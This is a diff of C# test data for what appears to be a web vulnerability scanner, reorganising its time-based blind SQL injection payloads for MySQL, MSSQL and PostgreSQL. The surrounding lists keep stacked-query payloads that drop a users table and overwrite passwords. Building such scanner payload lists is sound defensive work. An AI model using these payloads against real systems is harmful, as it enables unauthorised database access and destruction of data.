@@ -9,6 +9,7 @@ namespace WebVulnerabilitiesScanner.TestData
     public abstract class SqlInjectionTestData
     {
         public const int TimeValueForTimeBasedBlind_s = 5;
+        public const int TimeBasedBlindRequestsCountForAverage = 3;
 
         #region Boolean-based payloads
         private const string BooleanBasedOrStringTruePayload = "' OR '1'='1";
@@ -59,12 +60,24 @@ namespace WebVulnerabilitiesScanner.TestData
             new RequestSqlInjectionPayloadEntity("' AND 1=CAST((SELECT version()) AS INT)--", SqlInjectionType.ErrorBased),
             new RequestSqlInjectionPayloadEntity("' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", SqlInjectionType.ErrorBased),
 
-            new RequestSqlInjectionPayloadEntity($"' AND SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
-            new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
-            new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),
-
             new RequestSqlInjectionPayloadEntity("'; DROP TABLE users--", SqlInjectionType.StackedQueries),
             new RequestSqlInjectionPayloadEntity("'; UPDATE users SET password='hacked'--", SqlInjectionType.StackedQueries),
+        };
+
+        /// <summary>
+        /// Нагрузки для проверки time-based blind SQL-инъекции, которые вызывают задержку в ответе при успешной инъекции.
+        /// </summary>
+        public static readonly List<RequestSqlInjectionPayloadEntity> TimeBasedBlindPayloadsInfo = new List<RequestSqlInjectionPayloadEntity>
+        {
+            new RequestSqlInjectionPayloadEntity($"' AND SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' OR SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' OR IF(1=1, SLEEP({TimeValueForTimeBasedBlind_s}), 0)--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"'; IF (1=1) WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"'; SELECT pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' OR pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN 1=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) ELSE pg_sleep(0) END--", SqlInjectionType.TimeBasedBlind),
         };
 
         /// <summary>
